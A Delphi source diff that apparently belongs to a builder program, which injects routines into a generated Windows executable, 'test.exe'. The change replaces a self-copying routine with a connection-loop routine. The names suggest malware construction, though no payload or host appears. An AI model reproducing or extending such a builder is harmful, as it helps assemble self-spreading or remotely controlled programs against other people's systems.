@@ -8,7 +8,8 @@ uses
   untLoader in 'Loader\untLoader.pas',
   Sysutils,
   Classes,
-  untPE in 'Utils\untPE.pas';
+  untPE in 'Utils\untPE.pas',
+  untConnection in 'Functions\untConnection.pas';
 
 var
   mPE:TPEFile;
@@ -18,6 +19,9 @@ var
   dwSizeAll:DWORD;
   dwSize: DWORD;
 begin
+  //resolver_start();
+  //ConnectionLoop_CALLER();
+  //ExitProcess(0);
   mPE := TPEFile.Create;
   mPE.CreatePEBase;
 
@@ -25,10 +29,9 @@ begin
   mPE.AddFunction(@resolver_start, dwSize);
   mPE.CustomizeLoader(dwSizeAll);
 
-  dwSize := DWORD(@CopyMySelf_END) - DWORD(@CopyMySelf_CALLER);
-  mPE.AddFunction(@CopyMySelf_CALLER, dwSize);
+  dwSize := DWORD(@ConnectionLoop_END) - DWORD(@ConnectionLoop_CALLER);
+  mPE.AddFunction(@ConnectionLoop_CALLER, dwSize);
   mPE.FixSectionLen();
-
   mPE.SaveFile('test.exe');
   mPE.Free;
 end;
